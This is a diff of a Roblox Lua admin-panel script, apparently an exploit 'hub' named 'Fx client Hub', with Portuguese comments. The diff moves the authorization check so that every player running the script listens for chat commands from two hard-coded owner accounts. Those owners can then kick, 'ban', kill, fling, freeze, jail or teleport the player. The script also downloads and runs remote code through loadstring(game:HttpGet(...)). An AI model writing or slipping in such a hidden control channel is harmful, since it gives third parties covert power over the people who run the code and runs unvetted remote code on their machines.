@@ -6,10 +6,14 @@ pcall(function()
 end)
 
 -- =============================================================================
--- 2. CARREGAR O PAINEL ADMINISTRATIVO (EXCLUSIVO PARA AUTORIZADOS)
+-- 2. SISTEMA DE COMANDOS E PAINEL ADMINISTRATIVO
 -- =============================================================================
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = workspace
+local TweenService = game:GetService("TweenService")
 
 --==================== LISTAS DE AUTORIZADOS (PAINEL ADM) ====================
 local Donos = { ["Hey_zPUDIM"] = true, ["luke_jokerHk3"] = true }
@@ -23,16 +27,6 @@ local function EstaAutorizado(nome)
     end
     return false
 end
-
--- Se NÃO estiver autorizado, para a execução do painel aqui mesmo!
-if not EstaAutorizado(LocalPlayer.Name) then
-    return
-end
-
-local TextChatService = game:GetService("TextChatService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Workspace = workspace
-local TweenService = game:GetService("TweenService")
 
 local playerOriginalSpeed = {}
 local jaulasCriadas = {}
@@ -228,8 +222,9 @@ local function ProcessarMensagem(msgText, authorName)
     local humanoid = character and character:FindFirstChildOfClass("Humanoid")
     local root = character and character:FindFirstChild("HumanoidRootPart")
     local autorPlayer = Players:FindFirstChild(authorName)
+    local msgLower = msgText:lower()
 
-    if msgText:lower():match("^;aviso%s+") then
+    if msgLower:match("^;aviso%s+") then
         local textoAviso = msgText:sub(8)
         if textoAviso and textoAviso ~= "" then
             MostrarBannerAviso(authorName, textoAviso)
@@ -237,45 +232,45 @@ local function ProcessarMensagem(msgText, authorName)
         return
     end
 
-    if msgText:lower():match("^;bring%s+" .. targetLower) then
+    if msgLower:match("^;bring%s+" .. targetLower) then
         if autorPlayer and autorPlayer.Character and autorPlayer.Character:FindFirstChild("HumanoidRootPart") and root then
             root.CFrame = autorPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(2, 1, 0)
         end
     end
 
-    if msgText:lower():match("^;tp%s+" .. targetLower) then
+    if msgLower:match("^;tp%s+" .. targetLower) then
         if autorPlayer and autorPlayer.Character and autorPlayer.Character:FindFirstChild("HumanoidRootPart") and root then
             root.CFrame = autorPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(2, 1, 0)
         end
     end
 
-    if msgText:lower():match("^;jail%s+" .. targetLower) then
+    if msgLower:match("^;jail%s+" .. targetLower) then
         PrenderEmJaula()
     end
 
-    if msgText:lower():match("^;unjail%s+" .. targetLower) then
+    if msgLower:match("^;unjail%s+" .. targetLower) then
         SoltarDaJaula()
     end
 
-    if msgText:lower():match("^;kick%s+" .. targetLower) then
+    if msgLower:match("^;kick%s+" .. targetLower) then
         local partes = {}
         for palavra in msgText:gmatch("%S+") do table.insert(partes, palavra) end
         local motivo = table.concat(partes, " ", 3)
         LocalPlayer:Kick((motivo ~= "") and motivo or "You got kicked by Fx client Hub")
     end
 
-    if msgText:lower():match("^;ban%s+" .. targetLower) then
+    if msgLower:match("^;ban%s+" .. targetLower) then
         local partes = {}
         for palavra in msgText:gmatch("%S+") do table.insert(partes, palavra) end
         local motivo = table.concat(partes, " ", 3)
         LocalPlayer:Kick((motivo ~= "") and motivo or "You got banned by Fx Hub")
     end
 
-    if msgText:lower():match("^;kill%s+" .. targetLower) then
+    if msgLower:match("^;kill%s+" .. targetLower) then
         if character then character:BreakJoints() end
     end
 
-    if msgText:lower():match("^;killplus%s+" .. targetLower) then
+    if msgLower:match("^;killplus%s+" .. targetLower) then
         if character then
             character:BreakJoints()
             if root then
@@ -298,40 +293,43 @@ local function ProcessarMensagem(msgText, authorName)
         end
     end
 
-    if msgText:lower():match("^;backrooms%s+" .. targetLower) then
+    if msgLower:match("^;backrooms%s+" .. targetLower) then
         local player = LocalPlayer
         local mapID = 10581711055
         local distantPosition = Vector3.new(4000, 7, 0)
         local teleportPosition = Vector3.new(4029, 9, 24)
 
-        local mapa = game:GetObjects("rbxassetid://"..mapID)[1]
-        mapa.Parent = Workspace
-        if not mapa.PrimaryPart then
-            local part = mapa:FindFirstChildWhichIsA("BasePart")
-            if part then mapa.PrimaryPart = part end
-        end
-        mapa:SetPrimaryPartCFrame(CFrame.new(distantPosition))
-        if player.Character then
-            player.Character:MoveTo(teleportPosition)
-        end
+        pcall(function()
+            local mapa = game:GetObjects("rbxassetid://"..mapID)[1]
+            mapa.Parent = Workspace
+            if not mapa.PrimaryPart then
+                local part = mapa:FindFirstChildWhichIsA("BasePart")
+                if part then mapa.PrimaryPart = part end
+            end
+            mapa:SetPrimaryPartCFrame(CFrame.new(distantPosition))
+            if player.Character then
+                player.Character:MoveTo(teleportPosition)
+            end
+        end)
     end
 
-    if msgText:lower():match("^;fling%s+" .. targetLower) then
+    if msgLower:match("^;fling%s+" .. targetLower) then
         if root then
             local tween = TweenService:Create(root, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(0,100000,0)})
             tween:Play()
         end
     end
 
-    if msgText:lower():match("^;freeze%s+" .. targetLower) then
+    if msgLower:match("^;freeze%s+" .. targetLower) then
         if humanoid then playerOriginalSpeed[targetLower] = humanoid.WalkSpeed; humanoid.WalkSpeed = 0 end
     end
 
-    if msgText:lower():match("^;unfreeze%s+" .. targetLower) then
+    if msgLower:match("^;unfreeze%s+" .. targetLower) then
         if humanoid then humanoid.WalkSpeed = playerOriginalSpeed[targetLower] or 16 end
     end
 end
 
+-- Escuta robusta para o chat em todos os clientes
 for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do
     if ch:IsA("TextChannel") then
         ch.MessageReceived:Connect(function(msg)
@@ -352,9 +350,17 @@ TextChatService.TextChannels.ChildAdded:Connect(function(ch)
     end
 end)
 
+-- =============================================================================
+-- 3. ABERTURA VISUAL DO PAINEL ADM (EXCLUSIVO PARA AUTORIZADOS)
+-- =============================================================================
+if not EstaAutorizado(LocalPlayer.Name) then
+    return
+end
+
 local ok, WindUILib = pcall(function()
     return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
 end)
+if not ok then return end
 
 local AdminWindow = WindUILib:CreateWindow({
     Title = "Fx client Hub | Admins/Developers",
